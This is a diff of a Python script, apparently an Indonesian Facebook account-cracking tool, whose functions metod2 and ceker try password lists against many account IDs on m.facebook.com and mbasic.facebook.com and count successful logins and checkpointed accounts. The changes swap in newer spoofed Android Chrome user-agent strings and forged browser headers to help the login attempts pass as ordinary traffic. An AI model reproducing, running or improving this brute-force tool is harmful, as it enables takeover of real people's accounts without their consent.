@@ -482,9 +482,8 @@ def metod2(idf,pwv):
 	ses = requests.Session();rr = random.randint
 	prog.update(des,description=f"{xx}Asyinc{x} Oke : {hijo}{ok} {x} Cpe : {xx}{cp}{xxx} Check : {x}{loop}/{len(id)} ");prog.advance(des)
 	ua = random.choice(ugen)
-	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
+	ua2 = random.choice(["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"])
 	url = random.choice(["m.facebook.com"])
-	#url = random.choice(["m.alpha.facebook.com"])
 	ver = random.choice(["109","110","111","112",])
 	for pw in pwv:
 		try:
@@ -573,7 +572,7 @@ def metod2(idf,pwv):
 # *--> sedaerah tapyes	
 def ceker(idf,pw):
 	global cp
-	ua = "Mozilla/5.0 (Windows NT {str(rr(4,12))}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(83,103))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Safari/537.36"
+	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
 	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 	ses = requests.Session()
 	try:
